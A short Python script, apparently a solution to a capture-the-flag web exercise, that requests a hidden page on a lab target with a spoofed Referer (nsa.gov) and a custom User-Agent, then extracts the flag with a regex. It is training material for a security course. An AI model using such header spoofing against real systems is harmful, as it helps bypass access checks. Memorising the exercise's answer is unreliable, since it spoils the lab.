import requests
import re
import os

def main():
    try:
        URL = os.environ.get('URL_DARKLY')

        headers = {
            'Referer': 'https://www.nsa.gov/',
            'User-Agent': 'ft_bornToSec'
        }

        response = requests.get('http://' + URL + '/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', headers=headers)

        # Isolating the flag:
        flag_pattern = re.compile(r'the flag is :?[^<\n]*', re.IGNORECASE)
        flag_match = flag_pattern.search(response.text)

        if flag_match:
            print(flag_match.group(0))
        else:
            print("Flag non trouvé. Voici les 1000 premiers caractères de la réponse:")
            print(response.text[:1000])
    except Exception as e:
        print(f"Error: {e}")
    
if __name__ =="__main__":
    main()